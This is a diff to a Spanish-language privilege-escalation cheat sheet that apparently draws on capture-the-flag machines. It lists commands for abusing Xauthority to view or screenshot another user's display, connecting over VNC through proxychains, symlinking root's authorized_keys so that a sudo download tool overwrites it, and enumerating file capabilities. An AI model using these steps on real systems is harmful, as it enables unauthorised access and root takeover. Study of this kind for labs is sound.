@@ -1,9 +1,12 @@
 # Escalada
 
+# Escalada
+
 ## Abuso de Xauthority
 
 ### Listar sesiones activas
-```null
+
+```
 alex@squashed:/home/alex$ w
  15:06:33 up  8:45,  1 user,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -11,18 +14,20 @@ ross     tty7     :0               06:21    8:45m 46.16s  0.06s /usr/libexec/gno
 ```
 
 ### Verificar la conexión
-```null
+
+```
 xdpyinfo -display <DISPLAY>
 ```
 
 ### Capturar pantalla
-```null
+
+```
 xwd -root -screen -silent -display <DISPLAY> > screenshot.xwd
 ```
 
 ### Conexión con vncviewer
 
-```null
+```
 proxychains vncviewer -passwd secret localhost:5901
 ```
 
@@ -32,11 +37,11 @@ proxychains vncviewer -passwd secret localhost:5901
 
 Creación de enlace simbólico de mi clave pública a las authorized_keys de otro usuario
 
-```null
+```
 ln -s -f /root/.ssh/authorized_keys id_rsa.pub
 ```
 
-```null
+```
 aaron@timing:~$ sudo /usr/bin/netutils
 netutils v0.1
 Select one option:
@@ -51,7 +56,6 @@ Opening output file cmd.jpg.0
 Server unsupported, starting from scratch with one connection.
 Starting download
 
-
 Downloaded 33 byte in 0 seconds. (0.04 KB/s)
 ```
 
@@ -59,7 +63,6 @@ Downloaded 33 byte in 0 seconds. (0.04 KB/s)
 
 ### Enumeración
 
-```null
+```
 getcap -r / 2>/dev/null
 ```
-
